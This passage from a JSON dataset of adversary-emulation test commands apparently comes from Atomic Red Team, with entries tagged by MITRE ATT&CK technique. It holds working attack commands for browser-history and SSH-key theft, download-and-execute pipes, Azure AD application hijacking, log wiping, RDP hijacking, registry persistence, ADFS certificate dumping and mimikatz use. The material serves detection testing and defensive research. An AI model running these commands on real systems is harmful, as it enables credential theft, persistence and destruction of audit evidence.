        "Command": "$Username = (whoami).Split('\\')[1]\n$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"$Env:systemdrive\\Users\\$UserName\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"$Env:USERPROFILE\\Downloads\\chromebrowsinghistory.txt\"\n",
        "Description": "This test will extract browsing history of the chrome user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "powershell"
    },
    {
        "ID": 958,
        "Command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat\n",
        "Description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1074.001",
        "Shell": "powershell"
    },
    {
        "ID": 959,
        "Command": "curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > /tmp/T1074.001_discovery.log\n",
        "Description": "Utilize curl to download discovery.sh and execute a basic information gathering shell script\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1074.001",
        "Shell": "sh"
    },
    {
        "ID": 960,
        "Command": "Compress-Archive -Path \"PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\" -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force\n",
        "Description": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1074.001",
        "Shell": "powershell"
    },
    {
        "ID": 961,
        "Command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
        "Description": "Add a certificate to an Application through its Service Principal. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098.001",
        "Shell": "powershell"
    },
    {
        "ID": 962,
        "Command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\n\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\n$credNotAfter = (Get-Date).AddDays(1)\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\n\n$cert = New-SelfSignedCertificate -DnsName \"atomicredteam.example.com\" -FriendlyName \"AtomicCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\n\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"AtomicTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\n\nStart-Sleep -s 30\n$tenant = Get-AzureADTenantDetail\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\nWrite-Host \"End of Hijacking\"\n",
        "Description": "Add a certificate to an Application through its App Registration. The certificate can then be used to authenticate as the application.\nThis can be used for persistence, and also for privilege escalation by benefiting from the Application's rights.\nAn account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098.001",
        "Shell": "powershell"
    },
    {
        "ID": 963,
        "Command": "aws iam create-access-key --user-name atomicredteam > \"$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds\"\ncd \"$PathToAtomicsFolder/T1098.001/bin/\"\n./aws_secret.sh\n",
        "Description": "Adversaries create their own new access and secret keys to programatically interact with AWS environment, which is already compromised\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098.001",
        "Shell": "sh"
    },
    {
        "ID": 964,
        "Command": "$notepad = Start-Process notepad -passthru\nStart-Process \"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe\"\nStart-Sleep -Seconds 5\nStop-Process $notepad.id",
        "Description": "This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the \"Atomic Red Team\" caption after one or two seconds. ",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.003",
        "Shell": "powershell"
    },
    {
        "ID": 965,
        "Command": "sudo rm -rf /var/log/system.log\nif [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi\n",
        "Description": "Delete system and audit logs\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 966,
        "Command": "rm -rf /var/log/messages\nrm -rf /var/log/security\n",
        "Description": "Delete messages and security logs\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 967,
        "Command": "sudo log erase --all\nsudo log erase --ttl #Deletes only time-to-live log content\n",
        "Description": "This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 968,
        "Command": "sudo truncate -s 0 /var/log/system.log #size parameter shorthand\n",
        "Description": "This test truncates the system log files using the truncate utility with (-s 0) parameter which sets file size to zero, thus emptying the file content\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 969,
        "Command": "truncate -s 0 /var/log/messages #size parameter shorthand\ntruncate --size=0 /var/log/security #size parameter \n",
        "Description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 970,
        "Command": "sudo cat /dev/null > /var/log/system.log #truncating the file to zero bytes\nsudo dd if=/dev/zero bs=1000 count=5 of=/var/log/system.log #log file filled with null bytes(zeros)\n",
        "Description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 971,
        "Command": "cat /dev/null > /var/log/messages #truncating the file to zero bytes\ncat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)\n",
        "Description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 972,
        "Command": "sudo find /var/log -name 'system.log*' -exec rm {} \\; #using \"rm\" execution\nsudo find /var/log -name \"system.log.97.gz*\" -exec shred -u -z -n 3 {} \\; #using \"shred\" execution\nsudo find /var/log -name \"system.log.98.gz*\" -exec unlink {} \\; #using \"unlink\" execution\n",
        "Description": "This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 973,
        "Command": "sudo echo '' > /var/log/system.log\n",
        "Description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 974,
        "Command": "echo '' > /var/log/messages\n",
        "Description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 975,
        "Command": "sudo log -f /var/log/system.log | : > /var/log/system.log\n",
        "Description": "This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 976,
        "Command": "sudo unlink /var/log/system.log\n",
        "Description": "This test deletes the system log file using unlink utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 977,
        "Command": "unlink /var/log/messages\n",
        "Description": "This test deletes the messages log file using unlink utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 978,
        "Command": "sudo shred -u -z -n 3 /var/log/system.log\n",
        "Description": "This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 979,
        "Command": "sudo srm /var/log/system.log #system log file deletion\nsudo srm -r /var/log/ #recursive deletion of log files\n",
        "Description": "This test securely deletes the system log files individually and recursively using the srm utility.\nInstall srm using Homebrew with the command: brew install khell/homebrew-srm/srm\nRefer: https://github.com/khell/homebrew-srm/issues/1 for installation\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 980,
        "Command": "osascript -e 'do shell script \"rm /var/log/system.log\" with administrator privileges'\n",
        "Description": "This test deletes the system log file using osascript via \"do shell script\"(sh/bash by default) which in-turn spawns rm utility, requires admin privileges\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 981,
        "Command": "osascript -e 'tell application \"Finder\" to delete POSIX file \"/var/log/system.log\"'\n",
        "Description": "This test deletes the system log file using applescript using osascript via Finder application\nNote: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.\nRefer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 982,
        "Command": "sudo rm /var/log/journal/* #physically deletes the journal files, and not just their content\nsudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place\n",
        "Description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "sh"
    },
    {
        "ID": 983,
        "Command": "echo 0> /var/spool/mail/root\n",
        "Description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "bash"
    },
    {
        "ID": 984,
        "Command": "echo 0> /var/log/secure\n",
        "Description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.002",
        "Shell": "bash"
    },
    {
        "ID": 985,
        "Command": "docker build -t t1610 $PathtoAtomicsFolder/T1610/src/\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\n",
        "Description": "Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. They can do this using docker create and docker start commands. Kinsing & Doki was exploited using this technique. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1610",
        "Shell": "bash"
    },
    {
        "ID": 986,
        "Command": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon 1337 /dest:rdp-tcp#55\"\nnet start sesshijack\n",
        "Description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1563.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 987,
        "Command": "Copy-Item \"PathToAtomicsFolder\\T1546.009\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll -Force\nreg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nif($false){Restart-Computer} \n",
        "Description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.009",
        "Shell": "powershell"
    },
    {
        "ID": 988,
        "Command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n",
        "Description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.004",
        "Shell": "powershell"
    },
    {
        "ID": 989,
        "Command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n",
        "Description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.004",
        "Shell": "powershell"
    },
    {
        "ID": 990,
        "Command": "New-Item \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"DllName\" \"C:\\Windows\\Temp\\atomicNotificationPackage.dll\" -Type ExpandString -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Logon\" \"AtomicTestFunction\" -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Impersonate\" 1 -Type DWord -Force\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\AtomicRedTeam\" \"Asynchronous\" 0 -Type DWord -Force\n",
        "Description": "PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.\n\nUpon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.\n\nPlease note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.004",
        "Shell": "powershell"
    },
    {
        "ID": 991,
        "Command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n",
        "Description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.004",
        "Shell": "powershell"
    },
    {
        "ID": 992,
        "Command": "Set-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, C:\\Windows\\System32\\cmd.exe\" -Force\n",
        "Description": "PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.004",
        "Shell": "powershell"
    },
    {
        "ID": 993,
        "Command": "sudo cp $PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist /Library/LaunchDaemons/com.atomicredteam.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.atomicredteam.plist\n",
        "Description": "Utilize LaunchDaemon to launch `Hello World`\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1543.004",
        "Shell": "bash"
    },
    {
        "ID": 994,
        "Command": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n",
        "Description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 995,
        "Command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s\n",
        "Description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 996,
        "Command": "dir c:\\ /b /s .key | findstr /e .key\n",
        "Description": "Find private keys on the Windows file system.\nFile extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 997,
        "Command": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt\nexit 0\n",
        "Description": "Discover private SSH keys on a FreeBSD, macOS or Linux system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "sh"
    },
    {
        "ID": 998,
        "Command": "mkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \\;\nexit 0\n",
        "Description": "Copy private SSH keys on a Linux system to a staging folder using the `cp` command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "sh"
    },
    {
        "ID": 999,
        "Command": "mkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec gcp --parents {} /tmp/art-staging \\;\n",
        "Description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `cp` command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "sh"
    },
    {
        "ID": 1000,
        "Command": "mkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;\nexit 0\n",
        "Description": "Copy private SSH keys on a Linux or macOS system to a staging folder using the `rsync` command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "sh"
    },
    {
        "ID": 1001,
        "Command": "mkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;\n",
        "Description": "Copy private SSH keys on a FreeBSD system to a staging folder using the `rsync` command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "sh"
    },
    {
        "ID": 1002,
        "Command": "mkdir /tmp/GnuPG\nfind / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;\nexit 0\n",
        "Description": "Copy the users GnuPG (.gnupg) directory on a Mac or Linux system to a staging folder using the `rsync` command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "sh"
    },
    {
        "ID": 1003,
        "Command": "mkdir /tmp/GnuPG\nfind / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;\n",
        "Description": "Copy the users GnuPG (.gnupg) directory on a FreeBSD system to a staging folder using the `rsync` command.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "sh"
    },
    {
        "ID": 1004,
        "Command": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
        "Description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "powershell"
    },
    {
        "ID": 1005,
        "Command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"adfs_svc\"\n$PWord = ConvertTo-SecureString -String \"ReallyStrongPassword\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList Administrator, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server sts.contoso.com\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
        "Description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "powershell"
    },
    {
        "ID": 1006,
        "Command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx\n",
        "Description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "powershell"
    },
    {
        "ID": 1007,
        "Command": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\\atomicredteam.pfx -Password $mypwd\n",
        "Description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "powershell"
    },
    {
        "ID": 1008,
        "Command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\AtomicRedTeam.cer\n",
        "Description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "powershell"
    },
    {
        "ID": 1009,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit\n",
        "Description": "The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\nA successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1010,
        "Command": "copy \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password %TEMP%\\Easter_egg.password",
        "Description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1039",
        "Shell": "command_prompt"
    },
    {
        "ID": 1011,
        "Command": "copy-item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\" -Destination \"$Env:TEMP\\Easter_egg.password\"",
        "Description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1039",
        "Shell": "powershell"
    },
    {
        "ID": 1012,
        "Command": "rm ~/.bash_history\n",
        "Description": "Clears bash history via rm\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1013,
        "Command": "echo \"\" > ~/.bash_history\n",
